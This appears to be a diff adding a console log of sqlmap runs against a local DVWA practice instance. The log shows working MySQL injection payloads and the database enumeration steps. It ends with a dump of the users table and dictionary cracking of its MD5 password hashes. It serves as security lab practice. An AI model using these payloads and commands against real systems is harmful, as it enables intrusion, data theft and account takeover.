@@ -1,0 +1,313 @@
+PS D:\sqlmap> python .\sqlmap.py -u "http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie='security=low;PHPSESSID=17aeefe9lj6p9fk52s97tgbpgn'
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.7.3.6#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:09:13 /2023-04-16/
+
+[11:09:13] [INFO] resuming back-end DBMS 'mysql'
+[11:09:13] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 2781=2781#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1' AND GTID_SUBSET(CONCAT(0x716a767071,(SELECT (ELT(5261=5261,1))),0x71787a7871),5261)-- xXkk&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1345 FROM (SELECT(SLEEP(5)))aEqq)-- SZWF&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a767071,0x58466a71504a59696d78564f70444d63454a5554436463646c6c73584f6f5553726962546f7a4c63,0x71787a7871)#&Submit=Submit
+---
+[11:09:13] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.39, PHP 7.3.4
+back-end DBMS: MySQL >= 5.6
+[11:09:13] [INFO] fetched data logged to text files under 'C:\Users\c1533\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 11:09:13 /2023-04-16/
+
+PS D:\sqlmap> python .\sqlmap.py -u "http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie='security=low;PHPSESSID=17aeefe9lj6p9fk52s97tgbpgn' --dbs
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.7.3.6#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:10:29 /2023-04-16/
+
+[11:10:29] [INFO] resuming back-end DBMS 'mysql'
+[11:10:29] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 2781=2781#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1' AND GTID_SUBSET(CONCAT(0x716a767071,(SELECT (ELT(5261=5261,1))),0x71787a7871),5261)-- xXkk&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1345 FROM (SELECT(SLEEP(5)))aEqq)-- SZWF&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a767071,0x58466a71504a59696d78564f70444d63454a5554436463646c6c73584f6f5553726962546f7a4c63,0x71787a7871)#&Submit=Submit
+---
+[11:10:29] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.39, PHP 7.3.4
+back-end DBMS: MySQL >= 5.6
+[11:10:29] [INFO] fetching database names
+[11:10:29] [WARNING] reflective value(s) found and filtering out
+available databases [12]:
+[*] dbtest
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] pikachu
+[*] pkxss
+[*] sakila
+[*] sedictionary
+[*] sys
+[*] world
+[*] xss
+
+[11:10:29] [INFO] fetched data logged to text files under 'C:\Users\c1533\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 11:10:29 /2023-04-16/
+
+PS D:\sqlmap> python .\sqlmap.py -u "http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie='security=low;PHPSESSID=17aeefe9lj6p9fk52s97tgbpgn' -D dvwa --tables
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.7.3.6#dev}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:10:55 /2023-04-16/
+
+[11:10:55] [INFO] resuming back-end DBMS 'mysql'
+[11:10:55] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 2781=2781#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1' AND GTID_SUBSET(CONCAT(0x716a767071,(SELECT (ELT(5261=5261,1))),0x71787a7871),5261)-- xXkk&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1345 FROM (SELECT(SLEEP(5)))aEqq)-- SZWF&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a767071,0x58466a71504a59696d78564f70444d63454a5554436463646c6c73584f6f5553726962546f7a4c63,0x71787a7871)#&Submit=Submit
+---
+[11:10:55] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 7.3.4, Apache 2.4.39
+back-end DBMS: MySQL >= 5.6
+[11:10:55] [INFO] fetching tables for database: 'dvwa'
+[11:10:55] [WARNING] reflective value(s) found and filtering out
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+
+[11:10:55] [INFO] fetched data logged to text files under 'C:\Users\c1533\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 11:10:55 /2023-04-16/
+
+PS D:\sqlmap> python .\sqlmap.py -u "http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie='security=low;PHPSESSID=17aeefe9lj6p9fk52s97tgbpgn' -D dvwa -T users --columns
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.7.3.6#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:11:54 /2023-04-16/
+
+[11:11:54] [INFO] resuming back-end DBMS 'mysql'
+[11:11:54] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 2781=2781#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1' AND GTID_SUBSET(CONCAT(0x716a767071,(SELECT (ELT(5261=5261,1))),0x71787a7871),5261)-- xXkk&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1345 FROM (SELECT(SLEEP(5)))aEqq)-- SZWF&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a767071,0x58466a71504a59696d78564f70444d63454a5554436463646c6c73584f6f5553726962546f7a4c63,0x71787a7871)#&Submit=Submit
+---
+[11:11:54] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.39, PHP 7.3.4
+back-end DBMS: MySQL >= 5.6
+[11:11:54] [INFO] fetching columns for table 'users' in database 'dvwa'
+[11:11:54] [WARNING] reflective value(s) found and filtering out
+Database: dvwa
+Table: users
+[8 columns]
++--------------+-------------+
+| Column       | Type        |
++--------------+-------------+
+| password     | varchar(32) |
+| user         | varchar(15) |
+| avatar       | varchar(70) |
+| failed_login | int         |
+| first_name   | varchar(15) |
+| last_login   | timestamp   |
+| last_name    | varchar(15) |
+| user_id      | int         |
++--------------+-------------+
+
+[11:11:54] [INFO] fetched data logged to text files under 'C:\Users\c1533\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 11:11:54 /2023-04-16/
+
+PS D:\sqlmap> python .\sqlmap.py -u "http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie='security=low;PHPSESSID=17aeefe9lj6p9fk52s97tgbpgn' -D dvwa -T users -C "user,password" --dump
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.7.3.6#dev}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:12:29 /2023-04-16/
+
+[11:12:29] [INFO] resuming back-end DBMS 'mysql'
+[11:12:29] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 2781=2781#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1' AND GTID_SUBSET(CONCAT(0x716a767071,(SELECT (ELT(5261=5261,1))),0x71787a7871),5261)-- xXkk&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1345 FROM (SELECT(SLEEP(5)))aEqq)-- SZWF&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a767071,0x58466a71504a59696d78564f70444d63454a5554436463646c6c73584f6f5553726962546f7a4c63,0x71787a7871)#&Submit=Submit
+---
+[11:12:30] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 7.3.4, Apache 2.4.39
+back-end DBMS: MySQL >= 5.6
+[11:12:30] [INFO] fetching entries of column(s) '`password`,`user`' for table 'users' in database 'dvwa'
+[11:12:30] [WARNING] reflective value(s) found and filtering out
+[11:12:30] [INFO] recognized possible password hashes in column '`password`'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[11:12:38] [INFO] writing hashes to a temporary file 'C:\Users\c1533\AppData\Local\Temp\sqlmaprw9_90u722852\sqlmaphashes-y5kx51ik.txt'
+do you want to crack them via a dictionary-based attack? [Y/n/q] y
+[11:12:40] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file 'D:\sqlmap\data\txt\wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+>
+
+[11:13:01] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] y
+[11:13:09] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[11:13:09] [INFO] starting 20 processes
+[11:13:13] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'
+[11:13:16] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
+[11:13:20] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
+[11:13:21] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
+[11:13:24] [INFO] using suffix '1'
+[11:13:38] [INFO] using suffix '123'
+[INFO] cracked password 'abc12311:13:43' for hash 'e99a18c428cb38d5f260853678922e03'
+[11:13:53] [INFO] using suffix '2'
+[11:14:08] [INFO] using suffix '12'
+[11:14:23] [INFO] using suffix '3'
+[11:14:37] [INFO] using suffix '13'
+[11:14:52] [INFO] using suffix '7'
+[11:15:07] [INFO] using suffix '11'
+[11:15:33] [INFO] using suffix '5'
+[11:15:48] [INFO] using suffix '22'
+[11:16:03] [INFO] using suffix '23'
+[11:16:17] [INFO] using suffix '01'
+[11:16:32] [INFO] using suffix '4'
+[11:16:48] [INFO] using suffix '07'
+[11:17:03] [INFO] using suffix '21'
+[11:17:17] [INFO] using suffix '14'
+[11:17:33] [INFO] using suffix '10'
+[11:17:49] [INFO] using suffix '06'
+[11:18:04] [INFO] using suffix '08'
+[11:18:18] [INFO] using suffix '8'
+[11:18:34] [INFO] using suffix '15'
+[11:18:50] [INFO] using suffix '69'
+[11:19:05] [INFO] using suffix '16'
+[11:19:21] [INFO] using suffix '6'
+[11:19:36] [INFO] using suffix '18'
+[11:19:52] [INFO] using suffix '!'
+[11:20:07] [INFO] using suffix '.'
+[11:20:23] [INFO] using suffix '*'
+[11:20:40] [INFO] using suffix '!!'
+[11:20:57] [INFO] using suffix '?'
+[11:21:13] [INFO] using suffix ';'
+[11:21:29] [INFO] using suffix '..'
+[11:21:45] [INFO] using suffix '!!!'
+[11:22:00] [INFO] using suffix ', '
+[11:22:15] [INFO] using suffix '@'
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------------------------------------------+
+| user    | password                                    |
++---------+---------------------------------------------+
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
++---------+---------------------------------------------+
+
+[11:22:30] [INFO] table 'dvwa.users' dumped to CSV file 'C:\Users\c1533\AppData\Local\sqlmap\output\127.0.0.1\dump\dvwa\users.csv'
+[11:22:30] [INFO] fetched data logged to text files under 'C:\Users\c1533\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 11:22:30 /2023-04-16/
